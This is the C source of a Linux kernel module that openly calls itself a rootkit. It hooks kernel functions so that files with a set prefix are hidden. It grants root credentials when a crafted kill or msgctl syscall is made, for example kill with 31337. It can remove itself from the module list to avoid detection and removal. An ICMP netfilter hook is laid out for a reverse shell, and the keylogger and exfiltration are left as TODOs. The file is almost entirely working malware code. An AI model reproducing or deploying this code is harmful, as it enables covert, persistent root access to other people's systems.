/**
 * @file    rootkit.c
 * @author  Aaron Lichtman
 * @brief   A rootkit. // TODO: Expand description
 */
#include <asm/unistd.h>
#include "khook/engine.c"
#include <linux/cred.h>
#include <linux/fs.h>
#include <linux/icmp.h>
#include <linux/inet.h>
#include <linux/init.h>
#include <linux/ipc.h>
#include <linux/ip.h>
#include <linux/jiffies.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/net.h>
#include <linux/pid.h>
#include <linux/sched.h>
#include <linux/signal.h>
#include <linux/skbuff.h>
#include <linux/syscalls.h>
#include <linux/threads.h>
#include <linux/timer.h>
#include <linux/types.h>
#include <linux/udp.h>
#include <linux/unistd.h>
#include <net/inet_sock.h>

MODULE_AUTHOR("Aaron Lichtman");
MODULE_DESCRIPTION("Linux rootkit.");
MODULE_VERSION("0.1");
MODULE_LICENSE("GPL");  // So the kernel doesn't complain about proprietary code

/**
 * Data structures
 */

#if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
typedef struct legacy_timer_emu {
	struct timer_list t;
	void (*function)(unsigned long);
	unsigned long data;
} _timer;
#else
typedef struct timer_list _timer;
#endif

// TODO: Extract this to an h file to avoid duplication.
#define GET_ROOT 0
#define KEYLOGGER_ENABLE 1
#define KEYLOGGER_DISABLE 2
#define FILE_HIDE_ADD 3
#define FILE_HIDE_RM 4
#define FILE_HIDE_SHOW 5
#define REVERSE_TCP_SHELL 6

// This action_task struct is what is actually passed to the LKM.
typedef struct action_task {
	int func_code;
	char* file_hide_str;
} action_task;

/**
 * Global defines and variables.
 */

#define POLLING_INTERVAL 1500
#define MAGIC_ROOT_NUM 31337
#define MAX_TASK_SIZE 200
static _timer polling_timer;
static struct nf_hook_ops icmp_hook;

// Module parameters

static bool block_removal = false;
module_param(block_removal, bool, 0770);
MODULE_PARM_DESC(block_removal, "Toggle for blocking removal of rootkit.");
static char* rev_shell_ip = NULL;
module_param(rev_shell_ip, charp, 0770);
MODULE_PARM_DESC(rev_shell_ip, "IP Address for reverse shell.");
static char* rev_shell_port = NULL;
module_param(rev_shell_port, charp, 0770);
MODULE_PARM_DESC(rev_shell_ip, "Port for reverse shell.");
// TODO: Convert to array of strings.
static char* hidden_file_prefix = NULL;
module_param(hidden_file_prefix, charp, 0770);
MODULE_PARM_DESC(hidden_file_prefix, "Prefix for hidden files.");
static bool keylogger = false;
module_param(keylogger, bool, 0770);
MODULE_PARM_DESC(keylogger, "Toggle for keylogger.");

/**
 * Forward declarations
 */

static int get_root(void);
static void do_something_on_interval(unsigned long data);

/**
 * Logging Helpers
 * // TODO: Fix
 */

void log_info(const char* message) {
	printk(KERN_INFO "GARDEN: %s", message);
}

void log_error(const char* message) {
	printk(KERN_ERR "GARDEN: %s", message);
}

/**
 * Handler for incoming action_tasks. Frees task memory if it doesn't return.
 */
int handle_task(action_task* task) {
	printk(KERN_EMERG "Handling function code: %d\n", task->func_code);

	switch (task->func_code) {
	case GET_ROOT:
		return get_root();

	case KEYLOGGER_ENABLE:
		// TODO
		break;

	case KEYLOGGER_DISABLE:
		// TODO
		break;

	case FILE_HIDE_ADD:
		// TODO
		break;

	case FILE_HIDE_RM:
		// TODO
		break;

	case FILE_HIDE_SHOW:
		// TODO: print contents of hidden_file_prefix array
		break;

	case REVERSE_TCP_SHELL:
		// TODO
		break;

	default:
		printk(KERN_ERR "Unexpected function code. This shouldn't be possible.\n");
		return -1;
	};

	return 0;
}

/**
 * Hook for communication with kernel from user program. If the first two arguments
 * are INT_MAX, then the third argument is a pointer to an action task_ struct.
 * Copy that from userspace and process it.
 */
KHOOK_EXT(long, __x64_sys_msgctl, const struct pt_regs*);
static long khook___x64_sys_msgctl(const struct pt_regs* regs) {
	action_task* task;
	int error;

	if (regs->di == INT_MAX && regs->si == INT_MAX) {
		printk(KERN_EMERG "sys_msgctl --Incoming command\n");
		task = kmalloc(MAX_TASK_SIZE + 1, GFP_KERNEL);
		copy_from_user(task, (const void*)regs->dx, MAX_TASK_SIZE);
		error = handle_task(task);
		kfree(task);
		return error;
	} else {
		return KHOOK_ORIGIN(__x64_sys_msgctl, regs);
	}
}

// /**
//  * Hook for opening up a reverse shell in response to a specially crafted ICMP
//  * packet.
//  */
// // ssize_t recv(int sockfd, void *buf, size_t len, int flags);
// KHOOK_EXT(ssize_t, __x64_sys_recv, const struct pt_regs*);
// static ssize_t khook___x64_sys_recv(const struct pt_regs* regs) {
// 	return KHOOK_ORIGIN(__x64_sys_recv, regs);
// }

/**
 * Hide files and directories.
 * Adapted from: https://github.com/f0rb1dd3n/Reptile/blob/0e562cffc4373d6774502a2f68fd758f58a2db75/rep_mod.c#L619
 */

/**
 * If this method returns true, the file in question should be hidden.
 */
static bool should_hide_file(const char* name) {
	if (hidden_file_prefix && !strncmp(name, hidden_file_prefix, strlen(hidden_file_prefix))) {
		printk(KERN_INFO "Hiding: %s\n", name);
		return true;
	}

	return false;
}

KHOOK_EXT(int, fillonedir, void*, const char*, int, loff_t, u64, unsigned int);
static int khook_fillonedir(void* __buf, const char* name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
	if (should_hide_file(name)) {
		return 0;
	}

	return KHOOK_ORIGIN(fillonedir, __buf, name, namlen, offset, ino, d_type);
}

KHOOK_EXT(int, filldir, void*, const char*, int, loff_t, u64, unsigned int);
static int khook_filldir(void* __buf, const char* name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
	if (should_hide_file(name)) {
		return 0;
	}

	return KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
}

KHOOK_EXT(int, filldir64, void*, const char*, int, loff_t, u64, unsigned int);
static int khook_filldir64(void* __buf, const char* name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
	if (should_hide_file(name)) {
		return 0;
	}

	return KHOOK_ORIGIN(filldir64, __buf, name, namlen, offset, ino, d_type);
}

KHOOK_EXT(int, compat_fillonedir, void*, const char*, int, loff_t, u64, unsigned int);
static int khook_compat_fillonedir(void* __buf, const char* name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
	if (should_hide_file(name)) {
		return 0;
	}

	return KHOOK_ORIGIN(compat_fillonedir, __buf, name, namlen, offset, ino, d_type);
}

KHOOK_EXT(int, compat_filldir, void*, const char*, int, loff_t, u64, unsigned int);
static int khook_compat_filldir(void* __buf, const char* name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
	if (should_hide_file(name)) {
		return 0;
	}

	return KHOOK_ORIGIN(compat_filldir, __buf, name, namlen, offset, ino, d_type);
}

KHOOK_EXT(struct dentry*, __d_lookup, const struct dentry*, const struct qstr*);
struct dentry* khook___d_lookup(const struct dentry* parent, const struct qstr* name) {
	if (should_hide_file(name->name)) {
		return NULL;
	}

	return KHOOK_ORIGIN(__d_lookup, parent, name);
}

/**
 * Drops the current user into a root shell.
 */
static int get_root(void) {
	struct cred* root_creds;
	printk(KERN_EMERG "One root coming right up.");
	root_creds = prepare_kernel_cred(NULL);
	return commit_creds(root_creds);
}

KHOOK_EXT(long, __x64_sys_kill, const struct pt_regs*);
static long khook___x64_sys_kill(const struct pt_regs* regs) {
	if (regs->di == MAGIC_ROOT_NUM) {
		return get_root();
	}

	return KHOOK_ORIGIN(__x64_sys_kill, regs);
}

/**
 * Timer and Command Polling Functions
 * Adapted from: https://github.com/aircrack-ng/rtl8812au/commit/f221a169f281dab9756a176ec2abd91e0eba7d19
 */

#if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
static void legacy_timer_function_wrapper(struct timer_list* timer) {
	struct legacy_timer_emu* legacy_timer = from_timer(legacy_timer, timer, t);
	// NOTE: legacy_timer->data is currently always NULL, but may not be in the future.
	legacy_timer->function(legacy_timer->data);
}
#endif

__inline void timer_init_wrapper(_timer* timer, void* func) {
	timer->data = 0;
	timer->function = func;
#if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
	timer_setup(&timer->t, legacy_timer_function_wrapper, 0);
#else
	init_timer(timer);
#endif
}

__inline static void set_timer(_timer* timer) {
	unsigned long expires = jiffies + msecs_to_jiffies(POLLING_INTERVAL);
#if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
	mod_timer(&timer->t, expires);
#else
	mod_timer(timer, expires);
#endif
	// printk("Timer configured to go off at %lu jiffies, in %lu msecs\n", expires, msecs_to_jiffies(POLLING_INTERVAL));
}

__inline static void timer_cleanup_wrapper(_timer* timer) {
#if (LINUX_VERSION_CODE >= KERNEL_VERSION(4, 15, 0))
	del_timer_sync(&timer->t);
#else
	del_timer_sync(timer);
#endif
}

/**
 * Do something on an interval, and then start a timer to call this
 * function again in the future.
 * NOTE: The data parameter is required in order for this to compile.
 */
static void do_something_on_interval(unsigned long data) {
	// TODO: Exfiltrate data.
	set_timer(&polling_timer);
}

/**
 * Net filter hook option for intercepting ICMP pings and
 * looking for reverse shell requests.
 **/
unsigned int icmp_hook_func(void* priv, struct sk_buff *skb, const struct nf_hook_state *state) {
	struct iphdr *ip_header;

	if (!skb) {
		return NF_DROP;
	}

	// TODO: Maybe use icmp_hdr()
	ip_header = (struct iphdr *) skb_network_header(skb);
	// If it's an ICMP packet coming from the IP address entered during config,
	// we should open a reverse shell.
	if (ip_header->protocol == IPPROTO_ICMP) { 
		char source_ip[16];
		printk(KERN_EMERG "%pI4", &ip_header->saddr);
		snprintf(source_ip, 16, "%pI4", &ip_header->saddr);

		if (!strncmp(source_ip, rev_shell_ip, 16)) {
			printk(KERN_EMERG "Reverse shell request found!\n"); 
		}
	}

	return NF_ACCEPT;
}

static void icmp_hook_init(void) {
	icmp_hook.hook = icmp_hook_func;
    icmp_hook.pf = PF_INET; // Filter by IPV4 packets
	icmp_hook.hooknum = 0; // Hook ICMP request
	icmp_hook.priority = NF_IP_PRI_FIRST; // See packets before every other hook function

    if (nf_register_net_hook(NULL, &icmp_hook)) {
    	printk(KERN_ERR "Some issue registering net hook.\n");	
    }
}

/**
 * Rootkit module initialization.
 */
static int __init rootkit_init(void) {
	printk(KERN_EMERG "Initializing rootkit...\n");
	khook_init();

	printk(KERN_EMERG "Initializing ICMP hook...\n");
	icmp_hook_init();

	printk(KERN_EMERG "Initializing timer...\n");
	timer_init_wrapper(&polling_timer, do_something_on_interval);
	set_timer(&polling_timer);

	if (block_removal) {
		printk(KERN_EMERG "Blocking removal and hiding rootkit...\n");
		list_del_init(&__this_module.list);
		kobject_del(&THIS_MODULE->mkobj.kobj);
	}

	// Gotta make the compiler happy.
	do_something_on_interval(0);
	return 0;
}

/**
 * Called when $ rmmod is executed. Cleans up rootkit nicely.
 */
static void __exit rootkit_exit(void) {
	printk(KERN_EMERG "rmmod called. Cleaning up rootkit.");
	khook_cleanup();
	nf_unregister_net_hook(NULL, &icmp_hook);
	timer_cleanup_wrapper(&polling_timer);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
